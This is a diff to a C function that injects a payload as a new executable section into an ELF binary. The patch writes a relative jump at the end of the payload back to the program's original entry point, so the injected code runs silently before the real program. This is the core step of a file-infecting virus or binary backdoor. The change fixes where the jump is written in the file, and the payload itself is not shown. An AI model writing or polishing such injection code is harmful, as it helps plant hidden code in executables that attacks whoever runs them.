@@ -62,20 +62,18 @@ void insert_executable_section(const char *elf_filename) {
     fseek(file, ehdr.e_phoff, SEEK_SET);
     fwrite(phdrs, sizeof(Elf64_Phdr), ehdr.e_phnum, file);
 
-    // Create the payload with a jump to the old entry point at the end
-
-	// Calculate the relative jump offset
-    Elf64_Addr jump_from = new_section_addr + payload_size_p - 5;
-    int32_t jump_offset = (int32_t)(old_entry_point - jump_from - 5);
-
-    // Write the relative jump instruction at the end of the payload
-    size_t jump_instr_offset = payload_size_p - 1190 - 5; // 5 bytes: 1 for opcode + 4 for offset
-    payload_p[jump_instr_offset] = 0xE9; // Opcode for jmp (relative)
-    memcpy(payload_p + jump_instr_offset + 1, &jump_offset, sizeof(int32_t));
-
     // Write the new section
     fseek(file, new_section_offset, SEEK_SET);
     fwrite(payload_p, 1, payload_size_p, file);
+
+    // Calculate the relative jump offset
+    Elf64_Addr jump_from = new_section_addr + payload_size_p - 5;
+    int32_t jump_offset = (int32_t)(old_entry_point - jump_from - 5);
+
+    // Write the relative jump instruction at the end of the payload in the file
+    fseek(file, new_section_offset + payload_size_p - 1190 - 5, SEEK_SET); // Move to the correct position
+    fputc(0xE9, file); // Write the opcode for jmp (relative)
+    fwrite(&jump_offset, sizeof(int32_t), 1, file); // Write the relative jump offset
 
     fclose(file);
     free(phdrs);
